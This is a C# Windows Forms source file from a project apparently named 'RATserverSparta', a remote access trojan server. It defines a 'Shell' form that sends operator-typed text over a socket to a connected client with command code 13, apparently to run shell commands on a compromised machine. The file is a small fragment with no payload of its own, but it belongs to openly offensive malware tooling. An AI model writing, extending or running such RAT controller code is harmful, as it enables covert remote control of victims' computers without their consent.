using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RATserverSparta.Tools.Shell
{
    public partial class Shell : Form
    {
        private Socket ClientSocket;
        public Shell(Socket ClientSocket)
        {
            InitializeComponent();
            this.ClientSocket = ClientSocket;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Client.SocketSend Data = new Client.SocketSend(this.ClientSocket);
            Data.Send(Encoding.ASCII.GetBytes(text.Text), 13);
            status.Text = "Sent.";
            status.ForeColor = Color.Green;
        }
    }
}
